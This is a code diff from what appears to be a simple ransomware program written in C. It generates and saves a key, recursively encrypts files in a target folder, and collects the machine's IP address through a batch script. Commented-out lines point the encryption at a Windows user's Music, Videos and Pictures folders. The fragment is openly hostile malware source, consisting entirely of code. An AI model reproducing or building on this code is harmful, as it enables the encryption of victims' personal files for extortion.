@@ -88,13 +88,14 @@ int main() {
   for (uint8_t i = 0; i < 32; i++)
     key[i] = rand() % 256;
 
+  /// SAVE KEY TO FILE
   FILE* kfile = fopen("key.bin", "wb");
   fwrite(key, sizeof(uint8_t), 32, kfile);
   fclose(kfile);
 
   /// ENCRYPT FILES
   // Encrypt Files in those folders and subfolders:
-  SearchFiles("testfolder", key);
+  SearchFiles("..\\testfolder", key);
   //SearchFiles("C:\\Users\\User\\Music", key);
   //SearchFiles("C:\\Users\\User\\Videos", key);
   //SearchFiles("C:\\Users\\User\\Pictures", key);
@@ -116,7 +117,7 @@ int main() {
 
   /// GET IP
   unsigned int ip[4];
-  system("getip.bat"); // it's the local ip, Opera close his ftp server to test ips
+  system("getip.bat");
   FILE* loadip = fopen("ip", "r+");
   fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
   fclose(loadip);
